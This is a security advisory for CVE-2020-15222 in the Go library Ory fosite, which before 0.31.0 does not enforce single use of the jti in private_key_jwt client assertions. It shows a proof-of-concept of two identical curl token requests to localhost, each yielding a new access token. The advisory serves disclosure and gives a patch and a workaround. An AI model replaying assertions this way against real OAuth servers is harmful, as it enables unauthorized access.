# Token reuse in Ory fosite

**GHSA**: GHSA-v3q9-2p3m-7g43 | **CVE**: CVE-2020-15222 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-287, CWE-345

**Affected Packages**:
- **github.com/ory/fosite** (go): < 0.31.0

## Description

### Impact

When using client authentication method "private_key_jwt" [[1]](https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication), OpenId specification says the following about assertion `jti`:

> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties

Hydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:

```
$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{"access_token":"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM","expires_in":3599,"scope":"application openid","token_type":"bearer"}⏎
$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{"access_token":"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4","expires_in":3599,"scope":"application openid","token_type":"bearer"}
```

### Patches

This issue is patched in 0.31.0.

### Workarounds

Do not allow clients to use `private_key_jwt`.

### References

https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication
